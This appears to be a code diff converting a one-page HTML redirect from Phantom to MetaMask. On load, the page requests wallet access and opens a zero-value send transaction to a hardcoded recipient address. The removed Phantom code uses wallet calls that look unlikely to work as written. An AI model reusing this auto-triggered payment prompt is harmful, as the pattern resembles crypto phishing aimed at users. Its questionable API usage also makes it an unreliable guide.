@@ -3,43 +3,45 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Open Phantom Wallet</title>
+    <title>Open MetaMask Wallet</title>
     <script>
-        async function openPhantomWallet() {
+        async function openMetaMaskWallet() {
             const recipientAddress = "0xEA585bCa3624025898141Dd9257B114449A10363"; // Receiver Address
-            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+            const amountInEther = "0"; // User enters manually if needed
 
-            if (isMobile) {
-                // 🚀 Open Phantom Mobile App (Solana Pay URL Scheme)
-                window.location.href = `https://phantom.app/ul/browse/${recipientAddress}`;
-            } else if (window.solana && window.solana.isPhantom) {
+            if (typeof window.ethereum !== "undefined") {
                 try {
-                    // 🚀 Request Phantom Connection
-                    await window.solana.connect();
+                    // 🚀 Request MetaMask Connection
+                    await window.ethereum.request({ method: "eth_requestAccounts" });
+                    
+                    const accounts = await window.ethereum.request({ method: "eth_accounts" });
+                    if (accounts.length === 0) {
+                        alert("⚠️ No MetaMask account found. Please connect your wallet.");
+                        return;
+                    }
 
-                    // 🚀 Open Phantom Send Transaction UI
-                    const transaction = {
-                        recipient: recipientAddress,
-                        amount: 0, // User enters manually
-                        network: "solana"
+                    // 🚀 Open MetaMask Send Transaction UI
+                    const transactionParameters = {
+                        to: recipientAddress, 
+                        from: accounts[0], 
+                        value: "0x" + (parseFloat(amountInEther) * 1e18).toString(16), // Convert ETH to Wei
                     };
 
-                    await window.solana.request({
-                        method: "transfer",
-                        params: [transaction]
+                    await window.ethereum.request({
+                        method: "eth_sendTransaction",
+                        params: [transactionParameters],
                     });
-
                 } catch (error) {
-                    console.error("Phantom Error:", error);
-                    alert("⚠️ Phantom couldn't be opened. Please open it manually.");
+                    console.error("MetaMask Error:", error);
+                    alert("⚠️ MetaMask couldn't be opened. Please open it manually.");
                 }
             } else {
-                alert("⚠️ Phantom Wallet is not installed! Please install it first.");
+                alert("⚠️ MetaMask Wallet is not installed! Please install it first.");
             }
         }
     </script>
 </head>
-<body onload="openPhantomWallet()">
-    <h1>Redirecting to Phantom Wallet...</h1>
+<body onload="openMetaMaskWallet()">
+    <h1>Redirecting to MetaMask Wallet...</h1>
 </body>
 </html>
